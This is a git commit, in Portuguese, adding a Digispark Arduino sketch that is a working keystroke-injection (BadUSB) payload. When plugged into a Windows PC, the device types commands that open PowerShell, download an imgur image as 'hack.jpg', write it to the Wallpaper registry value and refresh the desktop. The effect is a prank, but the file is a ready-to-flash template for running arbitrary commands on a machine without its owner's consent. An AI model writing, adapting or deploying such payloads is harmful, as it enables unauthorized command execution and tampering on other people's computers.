32eaa9f7b1c82e82edd37528c5fc68de4c8213ad
Cleidijane Morais Gomes <cleidijanemorais@gmail.com>
2023-04-11 17:10:27 -0300

    Background
    Script que baixa uma imagem altera o plano de fundo da área de trabalho via PowerShell.
    Primeiro comando abre o executar Win + R e abre o cmd PowerShell
    O segundo comando cria um navegador para download do arquivo
    O link https://i.imgur.com/22KMA31.jpg foi gerado de uma Imagem na internet
    O Terceiro e quarto comando realiza a alteração do plano de fundo através do regedit.
    Assim que o computador for reiniciado o plano de fundo irá mudar.

---
+++ background.ino
@@ -0,0 +1,48 @@
+#include "DigiKeyboardPtBr.h"
+
+
+void setup() {
+  DigiKeyboard.delay(5000); // espera 5 segundos antes de começar
+  
+}
+
+void loop() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("$client = new-object System.Net.WebClient");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("$client.DownloadFile(\"https://i.imgur.com/22KMA31.jpg\", \"hack.jpg\")");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /d \"%USERPROFILE%\\hack.jpg\" /f");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /d \"%USERPROFILE%\\hack.jpg\" /f");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("reg add \"HKCU\\Control Panel\\Desktop\" /v Wallpaper /d \"%USERPROFILE%\\hack.jpg\" /f");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("exit");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  for (;;) {
+    // vazio
+  }
+}
